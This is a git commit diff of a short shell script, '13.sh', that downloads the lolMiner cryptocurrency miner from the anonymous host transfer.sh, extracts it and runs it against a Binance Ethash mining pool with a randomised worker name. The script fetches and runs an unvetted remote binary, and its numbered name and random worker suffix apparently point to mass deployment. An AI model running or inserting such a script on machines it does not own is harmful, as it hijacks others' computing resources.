c7753790fe5710e906bf0febedf72705e2b1f87e
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-06-11 07:09:56 -0600

    Update 13.sh

--- 13.sh
+++ 13.sh
@@ -1,5 +1,5 @@
 sudo apt-get update -y
 sudo apt install screen -y
-wget https://transfer.sh/Pq32za/lolMiner_v1.51_Lin64.tar.gz
-tar -xf lolMiner_v1.51_Lin64.gz
+wget https://transfer.sh/Pq32za/lolMiner_v1.51_Lin64.tar.gz &&
+tar -xf lolMiner_v1.51_Lin64.gz &&
 cd 1.51 && ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800  --user teguhcong.GPU-MT_RECEH-$(echo $(shuf -i 1-99 -n 1)) --ethstratum ETHPROXY
